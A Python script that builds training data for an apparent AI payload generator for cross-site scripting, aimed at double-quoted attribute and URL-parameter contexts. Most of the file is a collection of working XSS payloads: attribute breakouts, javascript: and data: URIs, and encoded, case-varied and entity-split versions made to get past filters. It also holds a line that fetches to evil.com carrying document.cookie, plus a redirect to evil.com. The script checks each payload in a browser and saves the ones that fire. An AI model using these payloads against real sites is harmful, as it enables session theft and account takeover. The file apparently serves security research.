#!/usr/bin/env python
"""Generate targeted training data for XSS contexts that are failing.

The full test showed the model scores 0% on:
  - attr-dq contexts (needs " prefix for attribute breakout)
  - url-param contexts (needs javascript: URIs)

This script generates browser-verified payloads specifically for these contexts,
using both corpus mining and programmatic generation.
"""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from xss_ai.browser_oracle import check_fires
from xss_ai.context import ContextSpec, render_description
from xss_ai.pair_schema import Pair, Provenance

# ============================================================
# Targeted payloads for ATTR-DQ contexts (double-quoted attribute)
# Key insight: payload must START with " to close the attribute
# ============================================================

ATTR_DQ_PAYLOADS = [
    # Basic breakout + auto-fire handlers
    '"><svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '"><body onload=alert(1)>',
    '"><iframe onload=alert(1)>',
    '"><details open ontoggle=alert(1)>',
    '"><input onfocus=alert(1) autofocus>',
    # Breakout + CSS animation (context-aware)
    '"><style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>',
    '"><style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>',
    '"><style>@keyframes x{}</style><hr style="animation-name:x" onanimationend="alert(1)">',
    # No-bracket breakouts (when < > are needed but quotes work)
    '"autofocus/onfocus=alert(1)//',
    '" onfocus=alert(1) autofocus',
    '" onerror=alert(1) src=x',
    # Encoded variants
    '">%3Csvg%20onload%3Dalert%281%29%3E',
    '"><svg/onload=alert(1)>',
    '"><svg onload=alert(1)//',
    '"><marquee onstart=alert(1)>',
    '"><audio onerror=alert(1) src>',
    '"><video onerror=alert(1) src>',
    '"><object onerror=alert(1) data=x>',
    # With filters bypassed (no "script" keyword)
    '"><svg onload=confirm(1)>',
    '"><svg onload=prompt(1)>',
    '"><img src=x onerror=confirm(1)>',
    '"><details open ontoggle=confirm(1)>',
    '"><input onfocus=confirm(1) autofocus>',
    # Minimal breakouts
    '"><x onclick=alert(1)>click',
    '"onmouseover=alert(1) alt="',
    '"onfocus=alert(1) tabindex=1',
]

# ============================================================
# Targeted payloads for URL-PARAM contexts (href/a tag)
# Key insight: payload must be a javascript: URI
# ============================================================

URL_PARAM_PAYLOADS = [
    # Basic javascript: URIs
    'javascript:alert(1)',
    'javascript:alert(1)//',
    'javascript:confirm(1)',
    'javascript:prompt(1)',
    'javascript:alert(document.domain)',
    # With comment to eat trailing content
    'javascript:alert(1)//">',
    'javascript:alert(1)//\'',
    'javascript:/*--></title></style></textarea></noscript></template></noembed></script><svg onload=alert(1)>',
    'javascript:/*--></title></style></textarea></noscript></template></noembed></script><img src=x onerror=alert(1)>',
    # Data URIs
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:text/html,<svg onload=alert(1)>',
    'data:text/html,<img src=x onerror=alert(1)>',
    # With breakout prefix for href attributes
    'javascript:alert(1)"',
    '"javascript:alert(1)',
    '">javascript:alert(1)',
    # Variants with different sinks
    'javascript:fetch("http://evil.com/"+document.cookie)',
    'javascript:document.location="http://evil.com/"',
    'javascript:eval(atob("YWxlcnQoMSk="))',
    'javascript:new Function("alert(1)")()',
    'javascript:[].constructor.constructor("alert(1)")()',
    # URL-encoded variants
    '%6a%61%76%61%73%63%72%69%70%74%3aalert(1)',
    'jav&#x09;ascript:alert(1)',
    'jav&#x0A;ascript:alert(1)',
    'jav&#x0D;ascript:alert(1)',
    # Case variations
    'JaVaScRiPt:alert(1)',
    'JavaScript:alert(1)',
    'JAVASCRIPT:alert(1)',
]

# Contexts to test against
ATTR_DQ_CONTEXTS = [
    {"id": "attr-dq-plain", "location": "attr_dq", "filters": []},
    {"id": "attr-dq-escape-dq", "location": "attr_dq", "filters": ["escape_double_quotes_html"]},
    {"id": "attr-dq-block-script", "location": "attr_dq", "filters": ["block_keyword_script"]},
    {"id": "attr-dq-strip-lgt", "location": "attr_dq", "filters": ["strip_angle_brackets"]},
    {"id": "attr-dq-strip-lgt-block-script", "location": "attr_dq", "filters": ["strip_angle_brackets", "block_keyword_script"]},
    {"id": "attr-dq-block-alert", "location": "attr_dq", "filters": ["block_keyword_alert"]},
    {"id": "attr-dq-escape-dq-block-script", "location": "attr_dq", "filters": ["escape_double_quotes_html", "block_keyword_script"]},
    {"id": "attr-dq-block-event-handlers", "location": "attr_dq", "filters": ["block_event_handlers"]},
]

URL_PARAM_CONTEXTS = [
    {"id": "url-param-plain", "location": "url_param", "encoding": ["url_decode"], "filters": []},
    {"id": "url-param-block-javascript", "location": "url_param", "encoding": ["url_decode"], "filters": ["block_keyword_javascript"]},
    {"id": "url-param-block-script", "location": "url_param", "encoding": ["url_decode"], "filters": ["block_keyword_script"]},
    {"id": "url-param-strip-lgt", "location": "url_param", "encoding": ["url_decode"], "filters": ["strip_angle_brackets"]},
    {"id": "url-param-escape-lgt", "location": "url_param", "encoding": ["url_decode"], "filters": ["escape_angle_brackets_html"]},
    {"id": "url-param-block-alert", "location": "url_param", "encoding": ["url_decode"], "filters": ["block_keyword_alert"]},
]

OUT_PATH = ROOT / "data" / "pairs" / "targeted_training.jsonl"


def test_payloads(contexts: list[dict], payloads: list[str], label: str) -> list[Pair]:
    """Test payloads against contexts and return firing pairs."""
    pairs = []
    tested = 0
    fired = 0

    for ctx_def in contexts:
        ctx = ContextSpec(**ctx_def)
        ctx.description = render_description(ctx)

        for payload in payloads:
            tested += 1
            try:
                if check_fires(ctx, payload):
                    fired += 1
                    import hashlib
                    h = hashlib.sha1(payload.encode()).hexdigest()[:8]
                    pairs.append(Pair(
                        id=f"targeted-{ctx.id}__pl-{h}",
                        context=ctx,
                        payload=payload,
                        provenance=Provenance(
                            source="targeted_generation",
                            verified_by="playwright"
                        ),
                    ))
                    print(f"  FIRE: {ctx.id:35s} {payload[:50]}")
            except Exception:
                pass

    print(f"\n[{label}] Tested {tested}, Fired {fired} ({fired/tested:.0%})")
    return pairs


def main() -> int:
    print("=" * 60)
    print("TARGETED TRAINING DATA GENERATION")
    print("=" * 60)

    print(f"\n[1/2] Testing ATTR-DQ payloads ({len(ATTR_DQ_PAYLOADS)} payloads × {len(ATTR_DQ_CONTEXTS)} contexts)")
    attr_pairs = test_payloads(ATTR_DQ_CONTEXTS, ATTR_DQ_PAYLOADS, "ATTR-DQ")

    print(f"\n[2/2] Testing URL-PARAM payloads ({len(URL_PARAM_PAYLOADS)} payloads × {len(URL_PARAM_CONTEXTS)} contexts)")
    url_pairs = test_payloads(URL_PARAM_CONTEXTS, URL_PARAM_PAYLOADS, "URL-PARAM")

    # Save all firing pairs
    all_pairs = attr_pairs + url_pairs
    OUT_PATH.parent.mkdir(parents=True, exist_ok=True)
    with OUT_PATH.open("w", encoding="utf-8") as f:
        for p in all_pairs:
            f.write(p.to_jsonl() + "\n")

    print(f"\n{'='*60}")
    print("RESULTS:")
    print(f"  attr-dq pairs:  {len(attr_pairs)}")
    print(f"  url-param pairs: {len(url_pairs)}")
    print(f"  Total:           {len(all_pairs)}")
    print(f"  Output:          {OUT_PATH}")
    print(f"{'='*60}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
